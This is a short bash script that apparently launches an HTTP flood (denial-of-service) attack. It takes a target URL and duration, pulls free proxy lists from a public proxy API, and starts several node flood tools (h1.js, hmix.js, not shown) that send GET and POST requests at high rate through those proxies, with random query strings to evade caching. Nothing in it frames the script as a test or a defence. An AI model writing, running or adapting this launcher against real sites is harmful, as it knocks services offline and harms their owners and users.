#!/bin/bash

[ $# -lt 2 ] && echo "Usage: $0 URL TIME" && exit 1

URL=$1
TIME=$2

> live.txt
for p in http https; do
  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999&protocol=$p"
done | sort -u > live.txt

pids=""
for m in GET POST; do
  node h1.js $m "$URL" live.txt "$TIME" 999 10 randomstring=true & pids="$pids $!"
  node hmix.js -m $m -u $URL -s $TIME -p hihi.txt -t 10 -r 999 --full true -d false & pids="$pids $!"
done

wait $pids
